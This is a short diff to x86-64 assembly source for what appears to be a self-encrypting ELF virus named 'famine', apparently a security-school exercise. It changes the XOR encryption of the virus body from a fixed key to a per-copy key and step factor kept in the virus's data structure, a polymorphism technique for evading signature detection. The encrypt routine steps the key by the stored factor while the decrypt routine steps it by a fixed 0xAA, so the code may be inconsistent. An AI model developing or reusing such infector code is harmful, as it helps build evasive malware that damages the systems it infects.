@@ -10,6 +10,7 @@
 %define PF_W			0x2
 
 %define	_pwrite			18
+%define _read			0x0
 %define	_exit			60
 %define	_open			2
 %define	_close			3
@@ -85,7 +86,7 @@
 
 %macro CYPHER 0
 	xor r11, r11
-	mov rdi, 0xAA  ; key
+	mov rdi, STACK(famine.key)  ; key
 	mov rax, _start.enc_start
 	lea rdx, STACK(famine.tocypher + _start.enc_start - _start)
 	mov rcx, enc_end
@@ -95,7 +96,7 @@
 		xor r11, rdi
 		mov byte [rdx], r11b
 		inc rdx
-		inc rdi
+		add rdi, STACK(famine.factor)
 		loop .cyphering
 %endmacro
 
@@ -111,7 +112,7 @@
 		xor r11, rdi
 		mov byte [rdx], r11b
 		inc rdx
-		inc rdi
+		add rdi, 0xAA
 		loop .decyphering
 %endmacro
 ;Structures
@@ -192,5 +193,7 @@
 .file_size		resq	1				; Size of open file
 .jmp			resb	5				; jmp :  e9 xx xx xx xx 
 .file_data		resq	1				; Pointer to mmapped file data
-.tocypher		resb	0x5000
+.tocypher		resb	0x5000			; location to cyphered v
+.key			resb	1				; location to key
+.factor			resb	1				; factor to derivate key
 endstruc
